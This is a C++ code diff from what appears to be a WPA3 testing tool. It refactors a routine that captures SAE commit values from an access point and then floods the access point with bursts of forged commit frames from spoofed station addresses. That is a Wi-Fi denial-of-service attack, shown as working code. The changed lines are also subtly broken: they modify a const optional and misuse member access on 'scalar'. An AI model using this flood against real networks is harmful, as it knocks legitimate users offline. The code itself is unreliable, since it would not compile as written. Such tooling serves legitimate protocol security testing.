@@ -81,17 +81,17 @@ namespace wpa3_tester::memory_omnivore {
         
         // Capture real scalar+element via wpa_supplicant before switching to monitor
         log(LogLevel::INFO, "Capturing SAE commit values...");
-        const dos_helpers::SAEPair sae_params = cookie_guzzler::get_commit_values(
+        const optional<dos_helpers::SAEPair> sae_params = cookie_guzzler::get_commit_values(
             rs, attacker["iface"], attacker["sniff_iface"], ssid, ap["mac"], 30);
 
-        if (!sae_params.success)
+        if (!sae_params.has_value())
             throw runtime_error("Failed to capture SAE commit values");
 
         attacker->set_monitor_mode();
         attacker->up_iface();
 
         log(LogLevel::INFO, "Setup done, group_id=%u, scalar size=%zu",
-            sae_params.group_id, sae_params.scalar.size());
+            sae_params->group_id, sae_params.scalar->size());
 
         const HWAddress<6> ap_mac(ap["mac"]);
         const string iface = attacker["iface"];
@@ -123,9 +123,9 @@ namespace wpa3_tester::memory_omnivore {
             for (const auto &sta_mac : mac_pool) {
                 if (steady_clock::now() >= end_time) break;
 
-                sae_params.group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
+                sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
 
-                auto frame = make_sae_commit(ap_mac, sta_mac, sae_params);
+                auto frame = make_sae_commit(ap_mac, sta_mac, sae_params.value());
                 for (int i = 0; i < burst_size; ++i) {
                     sender.send(frame);
                     this_thread::sleep_for(nanoseconds(100));
